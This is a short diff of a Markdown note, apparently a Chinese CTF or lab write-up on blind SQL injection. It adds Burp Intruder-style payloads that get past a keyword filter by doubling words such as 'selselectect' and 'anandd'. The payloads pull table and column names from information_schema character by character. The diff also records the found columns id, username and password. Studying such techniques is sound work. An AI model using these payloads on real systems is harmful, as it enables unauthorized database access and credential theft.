@@ -1031,4 +1031,9 @@ username=admin'%20anandd%20length((selselectect%20table_name%20frfromom%20infoor
 username=admin'%20anandd%20subsubstrstr((selselectect%20table_name%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3ddatabase())%2c§1§%2c1)%20%3d%20'§a§'%20%23
 ```
 ![[Pasted image 20240328191209.png]]
-爆字段名 为
+爆字段名 为 id,username,password
+```
+username=admin'%20anandd%20subsubstrstr((selselectect%20group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name%3d'users'%20anandd%20table_schema%3ddatabase())%2c§1§%2c1)%20%3d%20'§i§'%20%23
+```
+![[Pasted image 20240328193336.png]]
+
